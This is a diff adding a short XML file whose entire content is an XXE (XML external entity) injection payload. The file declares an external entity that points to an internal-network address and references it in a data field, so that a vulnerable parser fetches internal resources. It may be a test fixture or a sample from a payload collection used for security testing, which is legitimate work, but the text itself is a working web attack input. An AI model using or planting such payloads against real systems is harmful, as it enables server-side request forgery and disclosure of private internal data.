@@ -1,0 +1,5 @@
+<?xml version="1.0" encoding="ISO-8859-1"?>
+<!DOCTYPE foo [<!ELEMENT foo ANY >
+<!ENTITY xxe SYSTEM "https://192.168.1.1/private" >]>
+<str><data1>&xxe;</data1><data2></data2></str>
+
